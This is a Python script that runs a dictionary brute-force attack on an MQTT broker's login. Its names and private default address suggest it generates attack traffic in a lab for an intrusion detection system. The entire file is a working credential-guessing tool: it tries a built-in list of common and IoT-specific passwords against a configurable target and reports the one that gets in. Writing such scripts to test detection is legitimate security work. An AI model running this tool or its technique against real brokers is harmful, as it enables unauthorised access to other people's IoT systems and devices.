#!/usr/bin/env python3
"""Dictionary brute force on the broker's MQTT login. Usage: mqtt_bruteforce [username] [max attempts]"""
import os
import sys
import time

import paho.mqtt.client as mqtt

TARGET = os.environ.get("TARGET", "172.30.0.10")
USER = sys.argv[1] if len(sys.argv) > 1 else "tinyids"
LIMIT = int(sys.argv[2]) if len(sys.argv) > 2 else 60
WORDS = ["123456", "password", "admin", "12345678", "qwerty", "123456789", "12345", "1234", "111111", "1234567",
         "dragon", "123123", "baseball", "abc123", "football", "monkey", "letmein", "696969", "shadow", "master",
         "666666", "qwertyuiop", "123321", "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx",
         "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1", "jordan", "jennifer", "zxcvbnm",
         "asdfgh", "hunter", "buster", "soccer", "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou",
         "2000", "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars", "klaster", "112233",
         "george", "computer", "michelle", "jessica", "pepper", "1111", "zxcvbn", "555555", "11111111",
         "mosquitto", "iot123", "tinyids", "tinyids123"]

print(f"MQTT brute force -> {TARGET}:1883, user '{USER}', up to {LIMIT} passwords")
for i, pw in enumerate(WORDS[:LIMIT], 1):
    result = {}
    # works with paho-mqtt 1.x (Ubuntu package) and 2.x; both use the 4-argument on_connect here
    if hasattr(mqtt, "CallbackAPIVersion"):
        c = mqtt.Client(mqtt.CallbackAPIVersion.VERSION1, client_id=f"bf-{i}")
    else:
        c = mqtt.Client(client_id=f"bf-{i}")
    c.username_pw_set(USER, pw)
    c.on_connect = lambda cl, u, f, rc: result.setdefault("rc", rc)
    try:
        c.connect(TARGET, 1883, keepalive=5)
        c.loop_start()
        t = time.time()
        while "rc" not in result and time.time() - t < 3:
            time.sleep(0.02)
        c.loop_stop()
        c.disconnect()
    except OSError as e:
        result["rc"] = str(e)
    ok = result.get("rc") == 0
    print(f"  try {i:2d}: {pw:<12} -> {'SUCCESS' if ok else 'refused'}")
    if ok:
        print(f"password found: {pw}")
        break
    time.sleep(0.1)
